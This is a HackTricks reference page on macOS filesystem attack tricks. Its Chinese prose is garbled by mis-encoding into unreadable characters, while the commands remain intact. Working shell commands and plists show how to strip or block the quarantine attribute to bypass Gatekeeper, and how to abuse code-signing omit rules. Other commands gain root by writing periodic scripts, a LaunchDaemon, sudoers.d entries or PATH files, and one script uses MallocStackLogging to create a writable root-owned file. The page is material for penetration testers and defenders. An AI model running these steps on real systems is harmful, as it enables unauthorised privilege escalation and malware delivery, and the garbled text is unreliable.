<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>macOS FS Tricks</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../../favicon.svg">
        <link rel="shortcut icon" href="../../../../favicon.png">
        <link rel="stylesheet" href="../../../../css/variables.css">
        <link rel="stylesheet" href="../../../../css/general.css">
        <link rel="stylesheet" href="../../../../css/chrome.css">
        <link rel="stylesheet" href="../../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../../highlight.css">
        <link rel="stylesheet" href="../../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="macos-fs-tricks"><a class="header" href="#macos-fs-tricks">macOS FS Tricks</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h2 id="posix-æƒé™ç»„åˆ"><a class="header" href="#posix-æƒé™ç»„åˆ">POSIX æƒé™ç»„åˆ</a></h2>
<p><strong>ç›®å½•</strong>ä¸­çš„æƒé™ï¼š</p>
<ul>
<li><strong>è¯»å–</strong> - ä½ å¯ä»¥<strong>æšä¸¾</strong>ç›®å½•æ¡ç›®</li>
<li><strong>å†™å…¥</strong> - ä½ å¯ä»¥<strong>åˆ é™¤/å†™å…¥</strong>ç›®å½•ä¸­çš„<strong>æ–‡ä»¶</strong>ï¼Œå¹¶ä¸”å¯ä»¥<strong>åˆ é™¤ç©ºæ–‡ä»¶å¤¹</strong>ã€‚</li>
<li>ä½†ä½ <strong>ä¸èƒ½åˆ é™¤/ä¿®æ”¹éç©ºæ–‡ä»¶å¤¹</strong>ï¼Œé™¤éä½ å¯¹å…¶æ‹¥æœ‰å†™å…¥æƒé™ã€‚</li>
<li>ä½ <strong>ä¸èƒ½ä¿®æ”¹æ–‡ä»¶å¤¹çš„åç§°</strong>ï¼Œé™¤éä½ æ‹¥æœ‰å®ƒã€‚</li>
<li><strong>æ‰§è¡Œ</strong> - ä½ è¢«<strong>å…è®¸éå†</strong>ç›®å½• - å¦‚æœä½ æ²¡æœ‰è¿™ä¸ªæƒé™ï¼Œä½ å°†æ— æ³•è®¿é—®å…¶ä¸­çš„ä»»ä½•æ–‡ä»¶æˆ–ä»»ä½•å­ç›®å½•ã€‚</li>
</ul>
<h3 id="å±é™©ç»„åˆ"><a class="header" href="#å±é™©ç»„åˆ">å±é™©ç»„åˆ</a></h3>
<p><strong>å¦‚ä½•è¦†ç›–ä¸€ä¸ªç”± root æ‹¥æœ‰çš„æ–‡ä»¶/æ–‡ä»¶å¤¹</strong>ï¼Œä½†ï¼š</p>
<ul>
<li>è·¯å¾„ä¸­çš„ä¸€ä¸ªçˆ¶<strong>ç›®å½•æ‰€æœ‰è€…</strong>æ˜¯ç”¨æˆ·</li>
<li>è·¯å¾„ä¸­çš„ä¸€ä¸ªçˆ¶<strong>ç›®å½•æ‰€æœ‰è€…</strong>æ˜¯å…·æœ‰<strong>å†™å…¥æƒé™</strong>çš„<strong>ç”¨æˆ·ç»„</strong></li>
<li>ä¸€ä¸ªç”¨æˆ·<strong>ç»„</strong>å¯¹<strong>æ–‡ä»¶</strong>å…·æœ‰<strong>å†™å…¥</strong>æƒé™</li>
</ul>
<p>åœ¨ä»»ä½•ä¸Šè¿°ç»„åˆä¸­ï¼Œæ”»å‡»è€…å¯ä»¥<strong>æ³¨å…¥</strong>ä¸€ä¸ª<strong>ç¬¦å·/ç¡¬é“¾æ¥</strong>åˆ°é¢„æœŸè·¯å¾„ï¼Œä»¥è·å¾—ç‰¹æƒçš„ä»»æ„å†™å…¥ã€‚</p>
<h3 id="æ–‡ä»¶å¤¹-root-rx-ç‰¹æ®Šæƒ…å†µ"><a class="header" href="#æ–‡ä»¶å¤¹-root-rx-ç‰¹æ®Šæƒ…å†µ">æ–‡ä»¶å¤¹ root R+X ç‰¹æ®Šæƒ…å†µ</a></h3>
<p>å¦‚æœåœ¨ä¸€ä¸ª<strong>ç›®å½•</strong>ä¸­ï¼Œ<strong>åªæœ‰ root æ‹¥æœ‰ R+X è®¿é—®æƒé™</strong>ï¼Œé‚£ä¹ˆè¿™äº›æ–‡ä»¶å¯¹<strong>å…¶ä»–ä»»ä½•äººéƒ½ä¸å¯è®¿é—®</strong>ã€‚å› æ­¤ï¼Œå…è®¸å°†ä¸€ä¸ªç”¨æˆ·å¯è¯»çš„<strong>æ–‡ä»¶</strong>ï¼ˆç”±äºè¯¥<strong>é™åˆ¶</strong>è€Œæ— æ³•è¯»å–ï¼‰ä»æ­¤æ–‡ä»¶å¤¹<strong>ç§»åŠ¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶å¤¹</strong>çš„æ¼æ´ï¼Œå¯èƒ½è¢«æ»¥ç”¨ä»¥è¯»å–è¿™äº›æ–‡ä»¶ã€‚</p>
<p>ç¤ºä¾‹åœ¨ï¼š<a href="https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions">https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions</a></p>
<h2 id="ç¬¦å·é“¾æ¥--ç¡¬é“¾æ¥"><a class="header" href="#ç¬¦å·é“¾æ¥--ç¡¬é“¾æ¥">ç¬¦å·é“¾æ¥ / ç¡¬é“¾æ¥</a></h2>
<p>å¦‚æœä¸€ä¸ªç‰¹æƒè¿›ç¨‹æ­£åœ¨å†™å…¥ä¸€ä¸ª<strong>æ–‡ä»¶</strong>ï¼Œè¯¥æ–‡ä»¶å¯èƒ½è¢«<strong>ä½æƒé™ç”¨æˆ·æ§åˆ¶</strong>ï¼Œæˆ–è€…å¯èƒ½æ˜¯<strong>ä¹‹å‰ç”±ä½æƒé™ç”¨æˆ·åˆ›å»º</strong>çš„ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡ç¬¦å·é“¾æ¥æˆ–ç¡¬é“¾æ¥<strong>æŒ‡å‘å¦ä¸€ä¸ªæ–‡ä»¶</strong>ï¼Œç‰¹æƒè¿›ç¨‹å°†å†™å…¥è¯¥æ–‡ä»¶ã€‚</p>
<p>æŸ¥çœ‹å…¶ä»–éƒ¨åˆ†ï¼Œæ”»å‡»è€…å¯èƒ½ä¼š<strong>æ»¥ç”¨ä»»æ„å†™å…¥ä»¥æå‡æƒé™</strong>ã€‚</p>
<h2 id="fileloc"><a class="header" href="#fileloc">.fileloc</a></h2>
<p>å…·æœ‰**<code>.fileloc</code>** æ‰©å±•åçš„æ–‡ä»¶å¯ä»¥æŒ‡å‘å…¶ä»–åº”ç”¨ç¨‹åºæˆ–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤å½“å®ƒä»¬è¢«æ‰“å¼€æ—¶ï¼Œå°†æ‰§è¡Œè¯¥åº”ç”¨ç¨‹åº/äºŒè¿›åˆ¶æ–‡ä»¶ã€‚<br />
ç¤ºä¾‹ï¼š</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;URL&lt;/key&gt;
&lt;string&gt;file:///System/Applications/Calculator.app&lt;/string&gt;
&lt;key&gt;URLPrefix&lt;/key&gt;
&lt;integer&gt;0&lt;/integer&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<h2 id="arbitrary-fd"><a class="header" href="#arbitrary-fd">Arbitrary FD</a></h2>
<p>å¦‚æœä½ èƒ½è®©ä¸€ä¸ª <strong>è¿›ç¨‹ä»¥é«˜æƒé™æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</strong>ï¼Œä½ å¯ä»¥åˆ©ç”¨ <strong><code>crontab</code></strong> ä»¥ <strong><code>EDITOR=exploit.py</code></strong> æ‰“å¼€ <code>/etc/sudoers.d</code> ä¸­çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™æ · <code>exploit.py</code> å°†è·å¾—å¯¹ <code>/etc/sudoers</code> ä¸­æ–‡ä»¶çš„ FD å¹¶åŠ ä»¥åˆ©ç”¨ã€‚</p>
<p>ä¾‹å¦‚: <a href="https://youtu.be/f1HA5QhLQ7Y?t=21098">https://youtu.be/f1HA5QhLQ7Y?t=21098</a></p>
<h2 id="avoid-quarantine-xattrs-tricks"><a class="header" href="#avoid-quarantine-xattrs-tricks">Avoid quarantine xattrs tricks</a></h2>
<h3 id="remove-it"><a class="header" href="#remove-it">Remove it</a></h3>
<pre><code class="language-bash">xattr -d com.apple.quarantine /path/to/file_or_app
</code></pre>
<h3 id="uchg--uchange--uimmutable-æ ‡å¿—"><a class="header" href="#uchg--uchange--uimmutable-æ ‡å¿—">uchg / uchange / uimmutable æ ‡å¿—</a></h3>
<p>å¦‚æœä¸€ä¸ªæ–‡ä»¶/æ–‡ä»¶å¤¹å…·æœ‰æ­¤ä¸å¯å˜å±æ€§ï¼Œåˆ™æ— æ³•åœ¨å…¶ä¸Šæ”¾ç½® xattrã€‚</p>
<pre><code class="language-bash">echo asd &gt; /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
</code></pre>
<h3 id="defvfs-mount"><a class="header" href="#defvfs-mount">defvfs mount</a></h3>
<p>ä¸€ä¸ª <strong>devfs</strong> æŒ‚è½½ <strong>ä¸æ”¯æŒ xattr</strong>ï¼Œæ›´å¤šä¿¡æ¯è¯·å‚è§ <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html"><strong>CVE-2023-32364</strong></a></p>
<pre><code class="language-bash">mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
</code></pre>
<h3 id="writeextattr-acl"><a class="header" href="#writeextattr-acl">writeextattr ACL</a></h3>
<p>æ­¤ ACL é˜²æ­¢å‘æ–‡ä»¶æ·»åŠ  <code>xattrs</code></p>
<pre><code class="language-bash">rm -rf /tmp/test*
echo test &gt;/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
</code></pre>
<h3 id="comappleacltext-xattr--appledouble"><a class="header" href="#comappleacltext-xattr--appledouble"><strong>com.apple.acl.text xattr + AppleDouble</strong></a></h3>
<p><strong>AppleDouble</strong> æ–‡ä»¶æ ¼å¼å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶åŠå…¶ ACEã€‚</p>
<p>åœ¨ <a href="https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html"><strong>æºä»£ç </strong></a> ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå­˜å‚¨åœ¨åä¸º <strong><code>com.apple.acl.text</code></strong> çš„ xattr ä¸­çš„ ACL æ–‡æœ¬è¡¨ç¤ºå°†è¢«è®¾ç½®ä¸ºè§£å‹ç¼©æ–‡ä»¶ä¸­çš„ ACLã€‚å› æ­¤ï¼Œå¦‚æœä½ å°†ä¸€ä¸ªåº”ç”¨ç¨‹åºå‹ç¼©æˆä¸€ä¸ªå¸¦æœ‰ ACL çš„ <strong>AppleDouble</strong> æ–‡ä»¶æ ¼å¼çš„ zip æ–‡ä»¶ï¼Œè¯¥ ACL é˜»æ­¢å…¶ä»– xattrs è¢«å†™å…¥... é‚£ä¹ˆéš”ç¦» xattr å¹¶æ²¡æœ‰è¢«è®¾ç½®åˆ°åº”ç”¨ç¨‹åºä¸­ï¼š</p>
<p>æŸ¥çœ‹ <a href="https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/"><strong>åŸå§‹æŠ¥å‘Š</strong></a> è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<p>è¦å¤åˆ¶è¿™ä¸ªï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·å–æ­£ç¡®çš„ acl å­—ç¬¦ä¸²ï¼š</p>
<pre><code class="language-bash"># Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test &gt; del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
</code></pre>
<p>(Note that even if this works the sandbox write the quarantine xattr before)</p>
<p>ä¸æ˜¯çœŸçš„éœ€è¦ï¼Œä½†æˆ‘ç•™ç€ä»¥é˜²ä¸‡ä¸€ï¼š</p>
<p>{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
<a href="macos-xattr-acls-extra-stuff.html">macos-xattr-acls-extra-stuff.md</a>
{% endcontent-ref %}</p>
<h2 id="ç»•è¿‡ä»£ç ç­¾å"><a class="header" href="#ç»•è¿‡ä»£ç ç­¾å">ç»•è¿‡ä»£ç ç­¾å</a></h2>
<p>Bundles åŒ…å«æ–‡ä»¶ <strong><code>_CodeSignature/CodeResources</code></strong>ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ª <strong>file</strong> åœ¨ <strong>bundle</strong> ä¸­çš„ <strong>hash</strong>ã€‚è¯·æ³¨æ„ï¼ŒCodeResources çš„ hash ä¹Ÿ <strong>åµŒå…¥åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­</strong>ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿä¸èƒ½å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚</p>
<p>ç„¶è€Œï¼Œæœ‰ä¸€äº›æ–‡ä»¶çš„ç­¾åä¸ä¼šè¢«æ£€æŸ¥ï¼Œè¿™äº›æ–‡ä»¶åœ¨ plist ä¸­å…·æœ‰ omit é”®ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-xml">&lt;dict&gt;
...
&lt;key&gt;rules&lt;/key&gt;
&lt;dict&gt;
...
&lt;key&gt;^Resources/.*\.lproj/locversion.plist$&lt;/key&gt;
&lt;dict&gt;
&lt;key&gt;omit&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;weight&lt;/key&gt;
&lt;real&gt;1100&lt;/real&gt;
&lt;/dict&gt;
...
&lt;/dict&gt;
&lt;key&gt;rules2&lt;/key&gt;
...
&lt;key&gt;^(.*/)?\.DS_Store$&lt;/key&gt;
&lt;dict&gt;
&lt;key&gt;omit&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;weight&lt;/key&gt;
&lt;real&gt;2000&lt;/real&gt;
&lt;/dict&gt;
...
&lt;key&gt;^PkgInfo$&lt;/key&gt;
&lt;dict&gt;
&lt;key&gt;omit&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;weight&lt;/key&gt;
&lt;real&gt;20&lt;/real&gt;
&lt;/dict&gt;
...
&lt;key&gt;^Resources/.*\.lproj/locversion.plist$&lt;/key&gt;
&lt;dict&gt;
&lt;key&gt;omit&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;weight&lt;/key&gt;
&lt;real&gt;1100&lt;/real&gt;
&lt;/dict&gt;
...
&lt;/dict&gt;
</code></pre>
<p>å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œè®¡ç®—èµ„æºçš„ç­¾åï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
</code></pre>
<p>{% endcode %}</p>
<h2 id="æŒ‚è½½-dmgs"><a class="header" href="#æŒ‚è½½-dmgs">æŒ‚è½½ dmgs</a></h2>
<p>ç”¨æˆ·å¯ä»¥æŒ‚è½½ä¸€ä¸ªè‡ªå®šä¹‰çš„ dmgï¼Œå³ä½¿æ˜¯åœ¨æŸäº›ç°æœ‰æ–‡ä»¶å¤¹ä¸Šã€‚è¿™å°±æ˜¯æ‚¨å¦‚ä½•åˆ›å»ºä¸€ä¸ªåŒ…å«è‡ªå®šä¹‰å†…å®¹çš„è‡ªå®šä¹‰ dmg åŒ…ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1&gt;/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1&gt;/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" &gt; /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1&gt;/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
</code></pre>
<p>{% endcode %}</p>
<p>é€šå¸¸ï¼ŒmacOSé€šè¿‡ä¸<code>com.apple.DiskArbitrarion.diskarbitrariond</code> MachæœåŠ¡ï¼ˆç”±<code>/usr/libexec/diskarbitrationd</code>æä¾›ï¼‰è¿›è¡Œé€šä¿¡æ¥æŒ‚è½½ç£ç›˜ã€‚å¦‚æœåœ¨LaunchDaemons plistæ–‡ä»¶ä¸­æ·»åŠ å‚æ•°<code>-d</code>å¹¶é‡å¯ï¼Œå®ƒå°†æŠŠæ—¥å¿—å­˜å‚¨åœ¨<code>/var/log/diskarbitrationd.log</code>ä¸­ã€‚<br />
ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨åƒ<code>hdik</code>å’Œ<code>hdiutil</code>è¿™æ ·çš„å·¥å…·ç›´æ¥ä¸<code>com.apple.driver.DiskImages</code> kextè¿›è¡Œé€šä¿¡ã€‚</p>
<h2 id="ä»»æ„å†™å…¥"><a class="header" href="#ä»»æ„å†™å…¥">ä»»æ„å†™å…¥</a></h2>
<h3 id="å®šæœŸshè„šæœ¬"><a class="header" href="#å®šæœŸshè„šæœ¬">å®šæœŸshè„šæœ¬</a></h3>
<p>å¦‚æœæ‚¨çš„è„šæœ¬å¯ä»¥è¢«è§£é‡Šä¸º<strong>shellè„šæœ¬</strong>ï¼Œæ‚¨å¯ä»¥è¦†ç›–**<code>/etc/periodic/daily/999.local</code>** shellè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¯å¤©è§¦å‘ã€‚</p>
<p>æ‚¨å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤<strong>ä¼ªé€ </strong>æ­¤è„šæœ¬çš„æ‰§è¡Œï¼š<strong><code>sudo periodic daily</code></strong></p>
<h3 id="å®ˆæŠ¤è¿›ç¨‹"><a class="header" href="#å®ˆæŠ¤è¿›ç¨‹">å®ˆæŠ¤è¿›ç¨‹</a></h3>
<p>ç¼–å†™ä¸€ä¸ªä»»æ„çš„<strong>LaunchDaemon</strong>ï¼Œå¦‚**<code>/Library/LaunchDaemons/xyz.hacktricks.privesc.plist</code>**ï¼Œå…¶ä¸­plistæ‰§è¡Œä¸€ä¸ªä»»æ„è„šæœ¬ï¼Œå¦‚ï¼š</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.sample.Load&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;/Applications/Scripts/privesc.sh&lt;/string&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>Just generate the script <code>/Applications/Scripts/privesc.sh</code> with the <strong>commands</strong> you would like to run as root.</p>
<h3 id="sudoers-file"><a class="header" href="#sudoers-file">Sudoers File</a></h3>
<p>å¦‚æœä½ æœ‰ <strong>ä»»æ„å†™å…¥</strong> æƒé™ï¼Œä½ å¯ä»¥åœ¨ <strong><code>/etc/sudoers.d/</code></strong> æ–‡ä»¶å¤¹å†…åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæˆäºˆè‡ªå·± <strong>sudo</strong> æƒé™ã€‚</p>
<h3 id="path-files"><a class="header" href="#path-files">PATH files</a></h3>
<p>æ–‡ä»¶ <strong><code>/etc/paths</code></strong> æ˜¯å¡«å…… PATH ç¯å¢ƒå˜é‡çš„ä¸»è¦ä½ç½®ä¹‹ä¸€ã€‚ä½ å¿…é¡»æ˜¯ root æ‰èƒ½è¦†ç›–å®ƒï¼Œä½†å¦‚æœ <strong>ç‰¹æƒè¿›ç¨‹</strong> æ‰§è¡ŒæŸä¸ª <strong>å‘½ä»¤è€Œæ²¡æœ‰å®Œæ•´è·¯å¾„</strong>ï¼Œä½ å¯èƒ½èƒ½å¤Ÿé€šè¿‡ä¿®æ”¹æ­¤æ–‡ä»¶æ¥ <strong>åŠ«æŒ</strong> å®ƒã€‚</p>
<p>ä½ ä¹Ÿå¯ä»¥åœ¨ <strong><code>/etc/paths.d</code></strong> ä¸­å†™å…¥æ–‡ä»¶ï¼Œä»¥å°†æ–°æ–‡ä»¶å¤¹åŠ è½½åˆ° <code>PATH</code> ç¯å¢ƒå˜é‡ä¸­ã€‚</p>
<h2 id="ç”Ÿæˆå…¶ä»–ç”¨æˆ·å¯å†™çš„æ–‡ä»¶"><a class="header" href="#ç”Ÿæˆå…¶ä»–ç”¨æˆ·å¯å†™çš„æ–‡ä»¶">ç”Ÿæˆå…¶ä»–ç”¨æˆ·å¯å†™çš„æ–‡ä»¶</a></h2>
<p>è¿™å°†ç”Ÿæˆä¸€ä¸ªå±äº root çš„æ–‡ä»¶ï¼Œæˆ‘å¯ä»¥å†™å…¥ï¼ˆ<a href="https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh"><strong>ä»£ç æ¥è‡ªè¿™é‡Œ</strong></a>ï¼‰ã€‚è¿™ä¹Ÿå¯èƒ½ä½œä¸ºææƒå·¥ä½œï¼š</p>
<pre><code class="language-bash">DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
</code></pre>
<h2 id="posix-å…±äº«å†…å­˜"><a class="header" href="#posix-å…±äº«å†…å­˜">POSIX å…±äº«å†…å­˜</a></h2>
